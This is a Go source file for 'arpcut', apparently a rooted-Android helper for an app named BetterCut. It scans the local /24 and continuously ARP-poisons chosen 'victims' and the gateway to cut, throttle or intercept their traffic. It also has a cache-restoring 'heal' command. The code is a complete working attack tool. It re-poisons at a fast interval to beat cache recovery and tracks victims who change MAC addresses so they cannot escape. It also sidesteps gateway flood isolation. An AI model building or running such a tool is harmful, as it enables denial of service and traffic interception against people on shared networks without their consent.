// arpcut — tiny root ARP tool for BetterCut (Android arm64, run via `su -c`).
//
//	arpcut cut <iface> <gwIP> <gwMAC> <secs> <ip@mac>...
//	    Continuously ARP-poisons each victim <-> gateway so their traffic
//	    transits this phone. secs=0 runs forever (until killed).
//	arpcut heal <iface> <gwIP> <gwMAC> <ip@mac>...
//	    Restores correct ARP caches for each victim <-> gateway so a lifted
//	    cut takes effect immediately instead of waiting for cache timeout.
//	arpcut scan <iface>
//	    One raw ARP sweep of the /24, prints JSON [{"ip","mac"}].
//
// Poisoning uses AF_PACKET/SOCK_DGRAM (kernel supplies the Ethernet header from
// our iface; we write the 28-byte ARP body). We send BOTH an ARP request and a
// gratuitous ARP reply every round, to both the victim and the gateway, at a
// fast interval — different OSes honor different forms, and a short interval
// out-paces cache recovery (the cause of full-speed "bypass" spikes).
//
// This file is Linux-only (AF_PACKET). The portable, unit-tested pieces
// (arpBody, parseVictims, htons, ...) live in arp.go with no build constraint.

//go:build linux

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Re-poison interval. Override with ARPCUT_MS for stubborn targets.
func interval() time.Duration {
	ms := 500
	if v := os.Getenv("ARPCUT_MS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			ms = n
		}
	}
	return time.Duration(ms) * time.Millisecond
}

func openArp() (int, error) {
	return syscall.Socket(syscall.AF_PACKET, syscall.SOCK_DGRAM, int(htons(ethPARP)))
}

func sendArp(fd, ifindex int, dstMac net.HardwareAddr, body []byte) error {
	ll := syscall.SockaddrLinklayer{
		Protocol: htons(ethPARP),
		Ifindex:  ifindex,
		Hatype:   arphrdEth,
		Halen:    6,
	}
	copy(ll.Addr[:6], dstMac)
	return syscall.Sendto(fd, body, 0, &ll)
}

// logf writes a timestamped line to stderr. The app runs us with
// redirectErrorStream, so these land in the flight recorder / Diagnostics — the
// only way to see what the poisoner did on a device we can't attach a debugger to.
func logf(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[arpcut] "+format+"\n", args...)
}

// ifaceIPv4 returns the interface's own IPv4 address (needed as the sender IP of
// ARP probes), or nil.
func ifaceIPv4(ifi *net.Interface) net.IP {
	addrs, _ := ifi.Addrs()
	for _, a := range addrs {
		if n, ok := a.(*net.IPNet); ok && n.IP.To4() != nil {
			return n.IP.To4()
		}
	}
	return nil
}

// resolveMAC returns the CURRENT MAC for ip: first from the kernel ARP table
// (fast, no traffic), else by actively probing — sending ARP requests and
// reading replies until timeout. This is bettercap's FindMAC behaviour: never
// trust a stale scanned MAC, because a device may have changed it (randomized
// MAC rotation) or the scan entry may be old. Returns nil if unresolved.
func resolveMAC(fd int, ifi *net.Interface, myIP, ip net.IP, timeout time.Duration) net.HardwareAddr {
	if mac := arpTableLookup(ip.String(), ifi.Name); mac != nil {
		return mac
	}
	if myIP == nil {
		return nil
	}
	me := ifi.HardwareAddr
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
		&syscall.Timeval{Sec: 0, Usec: 200_000})
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 128)
	for time.Now().Before(deadline) {
		_ = sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, me, myIP, bcast, ip))
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil || n < 28 {
			continue
		}
		if binary.BigEndian.Uint16(buf[6:]) != arpReply {
			continue
		}
		if net.IP(buf[14:18]).Equal(ip) {
			return net.HardwareAddr(append([]byte(nil), buf[8:14]...))
		}
	}
	// clear the recv timeout so the poison loop isn't affected
	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
		&syscall.Timeval{Sec: 0, Usec: 0})
	return nil
}

// freshMAC re-resolves ip's MAC. It ALWAYS tries the kernel ARP table first
// (instant, no traffic). It only sends an active probe when probe==true AND the
// table missed — so the initial poison starts immediately (we already scanned,
// so the table is warm), and the slower probe is reserved for the periodic
// refresh that catches a device changing its MAC. Falls back to the known
// (scanned) mac so we never end up with none.
func freshMAC(fd int, ifi *net.Interface, myIP, ip net.IP, known net.HardwareAddr, probe bool) net.HardwareAddr {
	if m := arpTableLookup(ip.String(), ifi.Name); m != nil {
		if known != nil && !macEqual(m, known) {
			logf("MAC for %s changed %s -> %s", ip, known, m)
		}
		return m
	}
	if probe {
		if m := resolveMAC(fd, ifi, myIP, ip, 800*time.Millisecond); m != nil {
			return m
		}
	}
	return known
}

func doCut(a []string) {
	if len(a) < 5 {
		fmt.Fprintln(os.Stderr, "usage: arpcut cut <iface> <gwIP> <gwMAC> <secs> <ip@mac>...")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		fmt.Fprintf(os.Stderr, "iface %s: %v\n", a[0], err)
		os.Exit(1)
	}
	gwIP := net.ParseIP(a[1])
	gwMac := mustMAC(a[2])
	secs, _ := strconv.Atoi(a[3])
	vs := parseVictims(a[4:])
	if len(vs) == 0 {
		os.Exit(2)
	}

	fd, err := openArp()
	if err != nil {
		fmt.Fprintf(os.Stderr, "socket: %v\n", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)
	me := ifi.HardwareAddr
	myIP := ifaceIPv4(ifi)

	// Resolve the CURRENT gateway MAC (bettercap always works from a freshly
	// resolved MAC, never a stale one). Probe if it isn't already in the ARP
	// table; fall back to the caller-supplied MAC.
	gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, true)
	if gwMac == nil {
		logf("FATAL: gateway %s MAC unresolved", gwIP)
		os.Exit(1)
	}

	// Resolve each victim's current MAC (probe on a table miss so a stale scanned
	// MAC can't make the poison silently land nowhere), dropping the unreachable.
	live := vs[:0]
	for _, v := range vs {
		v.mac = freshMAC(fd, ifi, myIP, v.ip, v.mac, true)
		if v.mac == nil {
			logf("skip %s: MAC unresolved", v.ip)
			continue
		}
		if macEqual(v.mac, me) {
			logf("skip %s: is this device", v.ip)
			continue
		}
		live = append(live, v)
	}
	vs = live
	if len(vs) == 0 {
		logf("FATAL: no reachable victims")
		os.Exit(2)
	}
	logf("cutting %d victim(s) via gw %s (%s) on %s (%s)", len(vs), gwIP, gwMac, a[0], me)

	var deadline time.Time
	if secs > 0 {
		deadline = time.Now().Add(time.Duration(secs) * time.Second)
	}
	tick := interval()
	// Re-resolve MACs roughly every 15 s so a device that reconnects with a new
	// (randomized) MAC keeps getting poisoned instead of silently escaping.
	refreshEvery := int((15 * time.Second) / tick)
	if refreshEvery < 1 {
		refreshEvery = 1
	}
	round := 0
	for {
		if round > 0 && round%refreshEvery == 0 {
			gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, true)
			for i := range vs {
				vs[i].mac = freshMAC(fd, ifi, myIP, vs[i].ip, vs[i].mac, true)
			}
		}
		var sendErr error
		for _, v := range vs {
			// Poison victim: "gwIP is at me". Request (target=victim) + reply.
			if e := sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, me, gwIP, v.mac, v.ip)); e != nil {
				sendErr = e
			}
			sendArp(fd, ifi.Index, v.mac, arpBody(arpReply, me, gwIP, v.mac, v.ip))
			if v.both {
				// Poison gateway: "victimIP is at me". Only in full-duplex
				// (throttle/meter); a pure cut skips this so the gateway never
				// sees our MAC own another host's IP (avoids ARP-flood isolation).
				sendArp(fd, ifi.Index, gwMac, arpBody(arpRequest, me, v.ip, gwMac, gwIP))
				sendArp(fd, ifi.Index, gwMac, arpBody(arpReply, me, v.ip, gwMac, gwIP))
			}
		}
		// Surface a persistent send failure once per ~5 s so it shows in
		// Diagnostics rather than failing silently.
		if sendErr != nil && round%int(5*time.Second/tick+1) == 0 {
			logf("send error: %v", sendErr)
		}
		if secs > 0 && time.Now().After(deadline) {
			return
		}
		time.Sleep(tick)
		round++
	}
}

// doHeal restores correct ARP caches after a cut is lifted. Without this, a
// victim (and the gateway) keep the poisoned "<other> is at this-phone" entry
// until it times out on its own — minutes during which its traffic still tries
// to transit this phone.
//
//	heal <iface> <gwIP> <gwMAC> <ip@mac>...
//
// Reliability matters here: MANY stacks IGNORE an unsolicited unicast ARP reply,
// so a per-victim reply alone often fails to un-poison — which is why restores
// "left the network slow". The robust cure is a BROADCAST gratuitous ARP for the
// gateway, sent as BOTH reply and request forms and repeated: it forces every
// device on the segment to relearn gwIP->gwMAC at once, overwriting the poisoned
// entry. We also re-announce each victim's real MAC (broadcast) so the gateway
// and everyone else drop the "victimIP is at this-phone" entry.
func doHeal(a []string) {
	// iface, gwIP, gwMAC are required; victims are OPTIONAL — with none we still
	// broadcast the real gateway mapping, which un-poisons every device on the
	// segment (useful as a blanket "reset" when orphan poisoners hit hosts we no
	// longer track).
	if len(a) < 3 {
		fmt.Fprintln(os.Stderr, "usage: arpcut heal <iface> <gwIP> <gwMAC> [ip@mac...]")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		os.Exit(1)
	}
	gwIP := net.ParseIP(a[1])
	gwMac := mustMAC(a[2])
	vs := parseVictims(a[3:])
	fd, err := openArp()
	if err != nil {
		os.Exit(1)
	}
	defer syscall.Close(fd)
	myIP := ifaceIPv4(ifi)
	// Restore using the REAL current MACs (bettercap resolves them in unSpoof).
	// Our own ARP table isn't poisoned (we only poison others), so it holds the
	// true gateway + victim MACs.
	gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, false)
	if gwMac == nil {
		logf("heal: gateway %s MAC unresolved, aborting", gwIP)
		return
	}
	for i := range vs {
		vs[i].mac = freshMAC(fd, ifi, myIP, vs[i].ip, vs[i].mac, false)
	}
	logf("healing %d victim(s) + segment broadcast, gw %s (%s)", len(vs), gwIP, gwMac)
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	for round := 0; round < 10; round++ {
		// Broadcast the REAL gateway mapping to the whole segment — the key step
		// that un-poisons every victim's gwIP entry. Reply + gratuitous request.
		sendArp(fd, ifi.Index, bcast, arpBody(arpReply, gwMac, gwIP, bcast, gwIP))
		sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, gwMac, gwIP, bcast, gwIP))
		for _, v := range vs {
			// Unicast the real gateway mapping to the victim (reply + request)…
			sendArp(fd, ifi.Index, v.mac, arpBody(arpReply, gwMac, gwIP, v.mac, v.ip))
			sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, gwMac, gwIP, v.mac, v.ip))
			// …tell the gateway the real victim mapping…
			sendArp(fd, ifi.Index, gwMac, arpBody(arpReply, v.mac, v.ip, gwMac, gwIP))
			// …and broadcast the victim's real mapping so all relearn it.
			sendArp(fd, ifi.Index, bcast, arpBody(arpReply, v.mac, v.ip, bcast, v.ip))
		}
		time.Sleep(150 * time.Millisecond)
	}
}

func doScan(a []string) {
	if len(a) < 1 {
		fmt.Fprintln(os.Stderr, "usage: arpcut scan <iface>")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		os.Exit(1)
	}
	var myIP net.IP
	var ipnet *net.IPNet
	addrs, _ := ifi.Addrs()
	for _, ad := range addrs {
		if n, ok := ad.(*net.IPNet); ok && n.IP.To4() != nil {
			myIP, ipnet = n.IP.To4(), n
			break
		}
	}
	if myIP == nil {
		fmt.Println("[]")
		return
	}
	fd, err := openArp()
	if err != nil {
		os.Exit(1)
	}
	defer syscall.Close(fd)
	me := ifi.HardwareAddr
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	// Enumerate the /24 host range and request each.
	mask := ipnet.Mask
	base := myIP.Mask(mask)
	for i := 1; i < 255; i++ {
		ip := make(net.IP, 4)
		copy(ip, base)
		ip[3] = byte(i)
		if ip.Equal(myIP) {
			continue
		}
		sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, me, myIP, bcast, ip))
	}

	// Collect replies for a short window.
	found := map[string]string{}
	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
		&syscall.Timeval{Sec: 2})
	deadline := time.Now().Add(2 * time.Second)
	buf := make([]byte, 128)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil || n < 28 {
			continue
		}
		op := binary.BigEndian.Uint16(buf[6:])
		if op != arpReply {
			continue
		}
		mac := net.HardwareAddr(buf[8:14]).String()
		ip := net.IP(buf[14:18]).String()
		found[ip] = mac
	}
	var sb strings.Builder
	sb.WriteByte('[')
	first := true
	for ip, mac := range found {
		if !first {
			sb.WriteByte(',')
		}
		first = false
		fmt.Fprintf(&sb, `{"ip":"%s","mac":"%s"}`, ip, mac)
	}
	sb.WriteByte(']')
	fmt.Println(sb.String())
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: arpcut scan|cut ...")
		os.Exit(2)
	}
	switch os.Args[1] {
	case "cut":
		doCut(os.Args[2:])
	case "heal":
		doHeal(os.Args[2:])
	case "scan":
		doScan(os.Args[2:])
	default:
		fmt.Fprintln(os.Stderr, "usage: arpcut scan|cut ...")
		os.Exit(2)
	}
}
